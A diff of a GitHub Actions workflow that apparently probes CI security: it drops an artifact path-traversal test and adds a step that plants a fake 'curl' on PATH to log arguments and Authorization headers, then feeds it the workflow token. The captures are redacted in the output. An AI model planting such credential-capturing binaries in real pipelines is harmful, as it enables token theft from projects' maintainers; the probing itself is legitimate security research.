@@ -4,51 +4,53 @@ on:
 
 permissions:
   contents: read
-  actions: write
 
 jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      
-      - name: Create files with traversal-like paths
+      - name: Step 1 — create shadow binaries and add to PATH
         run: |
-          # Create a file structure that might cause path traversal when extracted
-          mkdir -p testdir/sub
-          echo "NORMAL_FILE" > testdir/normal.txt
-          echo "TRAVERSAL_CANARY_DATA" > testdir/sub/data.txt
+          mkdir -p /tmp/shadow-bin
           
-          # Can I create a symlink that makes the archive path contain ../?
-          # Symlink: testdir/link -> ../../etc/hostname
-          ln -s ../../etc/hostname testdir/link-hostname
+          # Create a fake 'curl' that captures all arguments
+          cat > /tmp/shadow-bin/curl << 'SCRIPT'
+          #!/bin/bash
+          echo "SHADOW_CURL_CAPTURED: $@" >> /tmp/shadow_captures.txt
+          # Also capture any Authorization headers
+          for arg in "$@"; do
+            if echo "$arg" | grep -qi "bearer\|token\|auth"; then
+              echo "AUTH_HEADER: $arg" >> /tmp/shadow_captures.txt
+            fi
+          done
+          # Forward to real curl
+          /usr/bin/curl "$@"
+          SCRIPT
+          chmod +x /tmp/shadow-bin/curl
           
-          # Also test: hardlink to file outside workspace
-          # (hardlinks can't cross filesystem boundaries, so this might fail)
-          ln /etc/hostname testdir/hardlink-hostname 2>/dev/null || echo "Hardlink failed (expected)"
-          
-          ls -la testdir/
-          
-      - name: Upload with traversal-path entries
-        uses: actions/upload-artifact@v4
-        with:
-          name: path-traversal-test
-          path: testdir/
-          retention-days: 1
+          # Add shadow directory to GITHUB_PATH (prepended to PATH)
+          echo "/tmp/shadow-bin" >> $GITHUB_PATH
+          echo "Step 1: Shadow bin created and added to GITHUB_PATH"
 
-      - name: Download and check extraction paths
-        uses: actions/download-artifact@v4
-        with:
-          name: path-traversal-test
-          path: download-dir
-
-      - name: Verify extracted paths
+      - name: Step 2 — use curl (should use shadow version)
+        env:
+          MY_TOKEN: ${{ github.token }}
         run: |
-          echo "=== Extracted structure ==="
-          find download-dir -type f -o -type l | head -20
+          echo "PATH=$PATH" | head -c 100
+          echo "..."
           echo ""
-          echo "=== Check for escaped files ==="
-          ls -la download-dir/../ 2>/dev/null | head -5
+          echo "Which curl: $(which curl)"
           echo ""
-          echo "=== Content of link-hostname ==="
-          cat download-dir/link-hostname 2>/dev/null || echo "link-hostname not found"
+          # This curl call should go through the shadow binary
+          curl -s -H "Authorization: Bearer $MY_TOKEN" https://api.github.com/user > /dev/null 2>&1
+          echo "Step 2: curl executed"
+
+      - name: Step 3 — check what was captured
+        run: |
+          echo "=== Shadow binary captures ==="
+          if [ -f /tmp/shadow_captures.txt ]; then
+            # Redact any tokens
+            cat /tmp/shadow_captures.txt | sed 's/ghs_[A-Za-z0-9]*/ghs_[SHADOW_CAPTURED]/g'
+          else
+            echo "No captures"
+          fi
